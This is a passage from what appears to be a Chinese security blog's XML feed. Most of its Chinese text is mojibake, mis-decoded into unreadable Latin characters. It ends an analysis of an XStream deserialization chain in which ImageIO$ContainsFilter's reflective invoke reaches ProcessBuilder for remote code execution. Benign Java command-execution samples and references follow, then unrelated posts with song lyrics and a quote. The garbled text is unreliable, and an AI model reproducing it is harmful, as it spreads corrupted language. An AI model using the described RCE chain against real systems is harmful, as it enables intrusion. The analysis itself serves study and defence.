alt="image-20230819142118262"></a></p><p>ç»§ç»­è·Ÿè¿› <code>javax.imageio.ImageIO$ContainsFilter</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819142333905.png" data-caption="image-20230819142333905"><img src="/../images/Java/deserialization/image-20230819142333905.png" alt="image-20230819142333905"></a></p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–¹æ³•è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ æ¥å— Objectç±»å‹çš„å‚æ•° eltï¼Œè¡¨ç¤ºè¦è¿›è¡Œè¿‡æ»¤çš„å…ƒç´ </span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">filter</span><span class="params">(Object elt)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨method.invoke(elt)æ–¹æ³•ï¼Œå°†eltä½œä¸ºå‚æ•°ï¼Œæ‰§è¡Œåå°„è°ƒç”¨,åå°„è°ƒç”¨è¿”å›ä¸€ä¸ªObjectç±»å‹çš„ç»“æœï¼Œéœ€è¦å°†å…¶å¼ºåˆ¶è½¬æ¢ä¸ºString[]ç±»å‹</span></span><br><span class="line">        <span class="keyword">return</span> contains((String[])method.invoke(elt), name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ç»§ç»­å±•å¼€ poc ä¸‹ filter ä¸‹çš„å…ƒç´ ï¼Œå‘ç°æ¥åˆ°äº†è§¦å‘æ‰§è¡Œå‘½ä»¤çš„ç±»ï¼Œæ‰€ä»¥ç”±äº <code>method.invoke(elt)</code> å¯æ§ï¼Œæ‰€ä»¥å¯¼è‡´ method å¯ä»¥é€šè¿‡ xml ä¸­<code>javax.imageio.ImageIO$ContainsFilter</code> å…ƒç´ åŒ…å«çš„ method å…ƒç´ è¢«æ§åˆ¶ï¼Œmethod é‡Œé¢çš„ <code>&lt;class&gt;</code> ä¸ºæˆ‘ä»¬è°ƒç”¨çš„æ¶æ„ç±»,ç”±äºç¨‹åºé»˜è®¤æ²¡æœ‰å¯¹å…¶é™åˆ¶æ‰€ä»¥å¯¼è‡´æ”»å‡»è€…å¯åˆ©ç”¨ <code>java.lang.ProcessBuilder</code> æ„é€ å‘½ä»¤æ‰§è¡Œ</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819143335818.png" data-caption="image-20230819143335818"><img src="/../images/Java/deserialization/image-20230819143335818.png" alt="image-20230819143335818"></a></p><p>æœ€å <code>method.invoke(elt)</code> æ‰§è¡Œå‘½ä»¤ï¼Œå…¶ä¸­ elt ä¸ºæ„é€ å¥½çš„ java.lang.ProcessBuilder å¯¹è±¡ã€‚æ‰€ä»¥åœ¨ method ä¸ elt éƒ½å¯æ§çš„æƒ…å†µä¸‹ï¼Œè¿›è¡Œåå°„è°ƒç”¨å³å¯å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œåˆ©ç”¨</p><p><em>æ³¨é‡Šï¼šJavaåå°„æœºåˆ¶æ˜¯æŒ‡åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°è·å–å’Œæ“ä½œç±»çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»çš„å±æ€§ã€æ–¹æ³•ã€æ„é€ å‡½æ•°ç­‰ã€‚é€šè¿‡åå°„ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œæ—¶æ£€æŸ¥ç±»çš„ç»“æ„ï¼Œåˆ›å»ºå¯¹è±¡ï¼Œè°ƒç”¨æ–¹æ³•ï¼Œè®¿é—®å’Œä¿®æ”¹å­—æ®µï¼Œç”šè‡³å¯ä»¥åŠ¨æ€åœ°ç”Ÿæˆæ–°çš„ç±»</em></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819152832987.png" data-caption="image-20230819152832987"><img src="/../images/Java/deserialization/image-20230819152832987.png" alt="image-20230819152832987"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819143916112.png" data-caption="image-20230819143916112"><img src="/../images/Java/deserialization/image-20230819143916112.png" alt="image-20230819143916112"></a></p><p>æœ€åå›åˆ°äº†æœ€åˆçš„ debug èµ·ç‚¹ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819143204447.png" data-caption="image-20230819143204447"><img src="/../images/Java/deserialization/image-20230819143204447.png" alt="image-20230819143204447"></a> </p><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>é€šè¿‡å¯¹ä»¥ä¸Šæ¡ˆä¾‹çš„åˆ†æï¼Œæ•´ä¸ªè¿‡ç¨‹è°ƒè¯•ä¸‹æ¥ä¸ªäººè¿˜æ˜¯å­¦åˆ°äº†ä¸å°‘ï¼Œä¸»è¦è¿˜æ˜¯æ€è·¯æ–¹é¢ï¼Œå¯¹äºæ•´ä½“è°ƒè¯•æ€è·¯æœ‰æ‰€å¸®åŠ©ã€‚æ€»ä½“ä¸Šå¯¹äºä¸ªäººæ¥è¯´,åœ¨åˆ†æè¿‡ç¨‹ä¸­æ— è®ºæ˜¯å¯¹ Java åŸºç¡€çš„è¯­æ³•ã€ä»£ç çš„å«ä¹‰ä»¥åŠå¼€å‘å·¥å…·çš„è¿ç”¨ç­‰ç­‰å‡éœ€è¦æœ‰ç‚¹ç§¯ç´¯æ‰èƒ½æ›´å¥½åœ°å¼€å±•åˆ†æè°ƒè¯•å·¥ä½œã€‚</p><h2 id="äº”ã€æ‰©å±•"><a href="#äº”ã€æ‰©å±•" class="headerlink" title="äº”ã€æ‰©å±•"></a>äº”ã€æ‰©å±•</h2><h3 id="å¸¸è§èƒ½èƒ½æ‰§è¡Œå‘½ä»¤çš„-java-ç±»"><a href="#å¸¸è§èƒ½èƒ½æ‰§è¡Œå‘½ä»¤çš„-java-ç±»" class="headerlink" title="å¸¸è§èƒ½èƒ½æ‰§è¡Œå‘½ä»¤çš„ java ç±»"></a>å¸¸è§èƒ½èƒ½æ‰§è¡Œå‘½ä»¤çš„ java ç±»</h3><ul><li><p><code>java.lang.Runtime</code>ï¼š<code>Runtime</code>ç±»æä¾›äº†æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹æ³•ï¼Œå¦‚<code>exec()</code>å’Œ<code>getRuntime()</code>ã€‚</p></li><li><p>java.lang.ProcessBuilder<code>ï¼š</code>ProcessBuilder&#96;ç±»ç”¨äºåˆ›å»ºè¿›ç¨‹ï¼Œå¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚å®ƒæä¾›äº†æ›´çµæ´»çš„æ–¹å¼æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶å¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡ã€å·¥ä½œç›®å½•ç­‰ã€‚</p></li><li><p><code>java.lang.Process</code>ï¼š<code>Process</code>ç±»è¡¨ç¤ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚å¯ä»¥ä½¿ç”¨<code>Process</code>ç±»çš„æ–¹æ³•æ¥è·å–è¿›ç¨‹çš„è¾“å…¥æµã€è¾“å‡ºæµå’Œé”™è¯¯æµï¼Œä»¥åŠç­‰å¾…è¿›ç¨‹å®Œæˆå¹¶è·å–æ‰§è¡Œç»“æœã€‚</p></li><li><p><code>java.lang.ProcessImpl</code>ï¼šè¿™æ˜¯<code>Process</code>ç±»çš„å®ç°ç±»ï¼Œå®ƒæ˜¯Javaå¯¹åº•å±‚æ“ä½œç³»ç»Ÿè¿›ç¨‹çš„å°è£…ã€‚</p></li></ul><p>ä½¿ç”¨ <code>Runtime</code> ç±»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç¤ºä¾‹ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SystemCommandExecution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>; <span class="comment">// æ›¿æ¢ä¸ºä½ è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è·å–å‘½ä»¤æ‰§è¡Œç»“æœ</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è¯»å–å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºç»“æœ</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;å‘½ä»¤æ‰§è¡Œå®Œæˆï¼Œé€€å‡ºç ï¼š&quot;</span> + exitCode);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä½¿ç”¨ <code>ProcessBuilder</code> ç±»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç¤ºä¾‹ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">            String[] command = &#123;<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-l&quot;</span>&#125;; <span class="comment">// æ›¿æ¢ä¸ºä½ è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤åŠå‚æ•°</span></span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(command);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è·å–å‘½ä»¤æ‰§è¡Œç»“æœ</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();</span><br><span class="line">            System.out.println(<span class="string">&quot;å‘½ä»¤æ‰§è¡Œå®Œæˆï¼Œé€€å‡ºç ï¼š&quot;</span> + exitCode);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="äº”ã€å‚è€ƒ"><a href="#äº”ã€å‚è€ƒ" class="headerlink" title="äº”ã€å‚è€ƒ"></a>äº”ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/v1ntlyn/p/14034019.html</span><br><span class="line">https://www.mi1k7ea.com/2019/10/21/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</span><br><span class="line">http://x-stream.github.io/converters.html</span><br><span class="line">https://x-stream.github.io/CVE-2020-26217.html</span><br><span class="line">https://mp.weixin.qq.com/s/0kWEaeZipT45BGyCu05z5A</span><br><span class="line">https://xz.aliyun.com/t/8694</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> JAVA </tag>
            
            <tag> Xstream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°ç«™æ‚è´§åº—-æ­Œæ›²åˆ†äº«ä¸€</title>
      <link href="/2024/03/18/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E6%AD%8C%E6%9B%B2%E5%88%86%E4%BA%AB%E4%B8%80/"/>
      <url>/2024/03/18/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E6%AD%8C%E6%9B%B2%E5%88%86%E4%BA%AB%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script>    <div id="aplayer-MxoBFSBi" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="544151118" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="æ­Œæ›²èƒŒæ™¯"><a href="#æ­Œæ›²èƒŒæ™¯" class="headerlink" title="æ­Œæ›²èƒŒæ™¯"></a>æ­Œæ›²èƒŒæ™¯</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ã€Šé¹¿æ¸¯å°é•‡ã€‹æ˜¯ç½—å¤§ä½‘1982å¹´é¦–å¼ ä¸“è¾‘ã€Šä¹‹ä¹è€…ä¹Ÿã€‹ä¸­çš„ç¬¬ä¸€é¦–æ­Œï¼Œæ®ä¸šå†…äººå£«è¯„ä»·ï¼Œè¿™é¦–æ­Œä¹Ÿæ˜¯ç½—å¤§ä½‘</span><br><span class="line">ç¬¬ä¸€æ”¯æ”¿æ²»æ­Œæ›²ã€‚è¯æ›²çš†ç”±ç½—å¤§ä½‘æœ¬äººåŒ…åŠï¼Œä½†æ˜¯ä»–æœ¬äººå´æœªæ›¾åˆ°è¿‡æ­Œæ›²ä¸­å”±åˆ°çš„é¹¿æ¸¯å°é•‡ã€‚æ®ç½—å¤§ä½‘æœ¬äºº</span><br><span class="line">æè¿°ï¼Œæ­Œæ›²çš„çµæ„Ÿæºäºä¸€ä¸ªæ´—è½¦çš„å°ä¼™ï¼Œåœ¨ä¸¤äººçš„äº¤è°ˆä¸­ç½—å¤§ä½‘äº†è§£åˆ°å°ä¼™å­æ¥è‡ªé¹¿æ¸¯å°é•‡ï¼Œå½“æ—¶çš„å°æ¹¾ç»</span><br><span class="line">æµæ­£å¤„äºå´›èµ·å’Œå‘å±•ä¸­ï¼Œç™¾åºŸå¾…å…´ï¼Œä½†ä¸æ­¤åŒæ—¶åŸä¹¡ç»æµå‘å±•çš„ä¸å¹³è¡¡ä¹Ÿè¿«ä½¿ä¸€éƒ¨åˆ†åŠ³åŠ¨åŠ›ä»è´«ç©·è½åçš„å°</span><br><span class="line">åœ°æ–¹é›†ä¸­åˆ°å‘å±•è¿…é€Ÿçš„åŸå¸‚ä¸­ï¼Œç¥ˆæ±‚èƒ½æ‰¾åˆ°å¥½çš„æœºä¼šï¼Œä½†ç°å®å´æ€»è®©äººä¼¤......</span><br></pre></td></tr></table></figure></div><br/><div class="highlight-wrap" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">ä½œè¯ : ç½—å¤§ä½‘</span><br><span class="line">ä½œæ›² : ç½—å¤§ä½‘</span><br><span class="line">ç¼–æ›² : å±±å´ç¨”</span><br><span class="line"></span><br><span class="line">å‡å¦‚ä½ å…ˆç”Ÿæ¥è‡ªé¹¿æ¸¯å°é•‡</span><br><span class="line">è¯·é—®ä½ æ˜¯å¦çœ‹è§æˆ‘çš„çˆ¹å¨˜</span><br><span class="line">æˆ‘å®¶å°±ä½åœ¨å¦ˆç¥–åº™çš„åé¢</span><br><span class="line">å–ç€é¦™ç«çš„é‚£å®¶å°æ‚è´§åº—</span><br><span class="line">å‡å¦‚ä½ å…ˆç”Ÿæ¥è‡ªé¹¿æ¸¯å°é•‡</span><br><span class="line">è¯·é—®ä½ æ˜¯å¦çœ‹è§æˆ‘çš„çˆ±äºº</span><br><span class="line">æƒ³å½“å¹´æˆ‘ç¦»å®¶æ—¶å¥¹ä¸€åå…«</span><br><span class="line">æœ‰ä¸€é¢—å–„è‰¯çš„å¿ƒå’Œä¸€å·é•¿å‘</span><br><span class="line"></span><br><span class="line">å°åŒ—ä¸æ˜¯æˆ‘çš„å®¶</span><br><span class="line">æˆ‘çš„å®¶ä¹¡æ²¡æœ‰éœ“è™¹ç¯</span><br><span class="line">é¹¿æ¸¯çš„è¡—é“ é¹¿æ¸¯çš„æ¸”æ‘</span><br><span class="line">å¦ˆç¥–åº™é‡Œçƒ§é¦™çš„äººä»¬</span><br><span class="line"></span><br><span class="line">å°åŒ—ä¸æ˜¯æˆ‘çš„å®¶</span><br><span class="line">æˆ‘çš„å®¶ä¹¡æ²¡æœ‰éœ“è™¹ç¯</span><br><span class="line">é¹¿æ¸¯çš„æ¸…æ™¨ é¹¿æ¸¯çš„é»„æ˜</span><br><span class="line">å¾˜å¾Šåœ¨æ–‡æ˜é‡Œçš„äººä»¬</span><br><span class="line"></span><br><span class="line">å‡å¦‚ä½ å…ˆç”Ÿå›åˆ°é¹¿æ¸¯å°é•‡</span><br><span class="line">è¯·é—®ä½ æ˜¯å¦å‘Šè¯‰æˆ‘çš„çˆ¹å¨˜</span><br><span class="line">å°åŒ—ä¸æ˜¯æˆ‘æƒ³è±¡çš„é»„é‡‘å¤©å ‚</span><br><span class="line">éƒ½å¸‚é‡Œæ²¡æœ‰å½“åˆæˆ‘çš„æ¢¦æƒ³</span><br><span class="line">åœ¨æ¢¦é‡Œæˆ‘å†åº¦å›åˆ°é¹¿æ¸¯å°é•‡</span><br><span class="line">åº™é‡Œè†œæ‹œçš„äººä»¬ä¾ç„¶è™”è¯š</span><br><span class="line">å²æœˆæ©ä¸ä½çˆ¹å¨˜æ·³æœ´çš„ç¬‘å®¹</span><br><span class="line">æ¢¦ä¸­çš„å§‘å¨˜ä¾ç„¶é•¿å‘ç›ˆç©º</span><br><span class="line"></span><br><span class="line">å°åŒ—ä¸æ˜¯æˆ‘çš„å®¶</span><br><span class="line">æˆ‘çš„å®¶ä¹¡æ²¡æœ‰éœ“è™¹ç¯</span><br><span class="line">é¹¿æ¸¯çš„è¡—é“ é¹¿æ¸¯çš„æ¸”æ‘</span><br><span class="line">å¦ˆç¥–åº™é‡Œçƒ§é¦™çš„äººä»¬</span><br><span class="line"></span><br><span class="line">å°åŒ—ä¸æ˜¯æˆ‘çš„å®¶</span><br><span class="line">æˆ‘çš„å®¶ä¹¡æ²¡æœ‰éœ“è™¹ç¯</span><br><span class="line">é¹¿æ¸¯çš„æ¸…æ™¨ é¹¿æ¸¯çš„é»„æ˜</span><br><span class="line">å¾˜å¾Šåœ¨æ–‡æ˜é‡Œçš„äººä»¬</span><br><span class="line"></span><br><span class="line">å†åº¦æˆ‘å”±èµ·è¿™é¦–æ­Œ</span><br><span class="line">æˆ‘çš„æ­Œä¸­å’Œæœ‰é£é›¨å£°</span><br><span class="line">å½’ä¸åˆ°çš„å®¶å›­ é¹¿æ¸¯çš„å°é•‡</span><br><span class="line">å½“å¹´ç¦»å®¶çš„å¹´è½»äºº</span><br><span class="line"></span><br><span class="line">å°åŒ—ä¸æ˜¯æˆ‘çš„å®¶</span><br><span class="line">æˆ‘çš„å®¶ä¹¡æ²¡æœ‰éœ“è™¹ç¯</span><br><span class="line">ç¹è£çš„éƒ½å¸‚ è¿‡æ¸¡çš„å°é•‡</span><br><span class="line">å¾˜å¾Šåœ¨æ–‡æ˜é‡Œçš„äººä»¬</span><br><span class="line"></span><br><span class="line">å“¦----</span><br><span class="line">å¬è¯´ä»–ä»¬æŒ–èµ°äº†å®¶ä¹¡çš„çº¢ç –ç Œä¸Šäº†æ°´æ³¥å¢™</span><br><span class="line">å®¶ä¹¡çš„äººä»¬å¾—åˆ°ä»–ä»¬æƒ³è¦çš„å´åˆå¤±å»ä»–ä»¬æ‹¥æœ‰çš„</span><br><span class="line">é—¨ä¸Šçš„ä¸€å—æ–‘é©³çš„æœ¨æ¿åˆ»ç€è¿™ä¹ˆå‡ å¥è¯</span><br><span class="line">å­å­å­™å­™æ°¸å®ç”¨ ä¸–ä¸–ä»£ä»£ä¼ é¦™ç«</span><br><span class="line"></span><br><span class="line">å•Š,é¹¿æ¸¯çš„å°é•‡</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å°ç«™æ‚è´§åº—-è·¯ä¸Šçš„é£æ™¯ï¼Œéœ€è¦æ€è€ƒã€æ„Ÿå—</title>
      <link href="/2024/02/16/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E8%B7%AF%E4%B8%8A%E7%9A%84%E9%A3%8E%E6%99%AF%EF%BC%8C%E9%9C%80%E8%A6%81%E6%80%9D%E8%80%83%E3%80%81%E6%84%9F%E5%8F%97/"/>
      <url>/2024/02/16/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E8%B7%AF%E4%B8%8A%E7%9A%84%E9%A3%8E%E6%99%AF%EF%BC%8C%E9%9C%80%E8%A6%81%E6%80%9D%E8%80%83%E3%80%81%E6%84%9F%E5%8F%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/private/find_your_life.jpg" data-caption="Find_Your_Life"><img src="/../images/private/find_your_life.jpg" alt="Find_Your_Life"></a></p><h2 id="è·¯ä¸Šçš„é£æ™¯ï¼Œéœ€è¦æ€è€ƒã€æ„Ÿå—"><a href="#è·¯ä¸Šçš„é£æ™¯ï¼Œéœ€è¦æ€è€ƒã€æ„Ÿå—" class="headerlink" title="è·¯ä¸Šçš„é£æ™¯ï¼Œéœ€è¦æ€è€ƒã€æ„Ÿå—"></a>è·¯ä¸Šçš„é£æ™¯ï¼Œéœ€è¦æ€è€ƒã€æ„Ÿå—</h2><p>â€œäººä»¬éƒ½å˜²ç¬‘æˆ‘ã€‚â€ â€œä¸ºä»€ä¹ˆå‘¢ï¼Ÿâ€ â€œå› ä¸ºæˆ‘æƒ³å†™æ•…äº‹ã€‚â€  - å¦‚æœåšæŸä»¶äº‹ä¼šè®©ä½ å¼€å¿ƒï¼Œé‚£ä¹ˆä½ åªç®¡å»åšï¼Œæ— è®ºåˆ«äººè¯´äº†ä»€ä¹ˆã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> å°ç«™æ‚è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç§»åŠ¨å®‰å…¨-IDA åŠ¨æ€è°ƒè¯• APP</title>
      <link href="/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-IDA%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%20APP/"/>
      <url>/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-IDA%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%20APP/</url>
      
